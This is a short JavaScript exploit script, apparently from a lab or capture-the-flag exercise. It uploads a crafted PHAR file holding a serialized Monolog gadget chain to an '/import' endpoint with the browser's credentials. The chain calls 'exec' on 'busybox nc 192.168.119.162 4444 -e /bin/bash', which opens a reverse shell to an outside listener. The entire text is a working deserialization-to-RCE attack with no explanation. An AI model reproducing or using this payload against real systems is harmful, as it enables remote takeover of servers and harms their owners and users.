const form = new FormData();
form.append('file', '<?php __HALT_COMPILER(); ?>\ní\x01\0\0\x01\0\0\0\x11\0\0\0\x01\0\0\0\0\0·\x01\0\0O:37:"Monolog\\Handler\\FingersCrossedHandler":3:{s:16:"\0*\0passthruLevel";i:0;s:9:"\0*\0buffer";a:1:{s:4:"test";a:2:{i:0;s:44:"busybox nc 192.168.119.162 4444 -e /bin/bash";s:5:"level";N;}}s:10:"\0*\0handler";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\0*\0handler";N;s:13:"\0*\0bufferSize";i:-1;s:9:"\0*\0buffer";N;s:8:"\0*\0level";N;s:14:"\0*\0initialized";b:1;s:14:"\0*\0bufferLimit";i:-1;s:13:"\0*\0processors";a:2:{i:0;s:7:"current";i:1;s:4:"exec";}}}\b\0\0\0test.txt\x04\0\0\0\fW\x94i\x04\0\0\0\f~\x7fØ¤\x01\0\0\0\0\0\0testÎ0Z|fÃ\x03àYçz\x83:F±»AG°ü\x02\0\0\0GBMB');

fetch('http://192.168.162.162/import', {
  method: 'POST',
  credentials: 'include',
  headers: {
    'Content-Type': 'multipart/form-data; boundary=---------------------------252743687121074920112894845385',
  },
  body: form,
});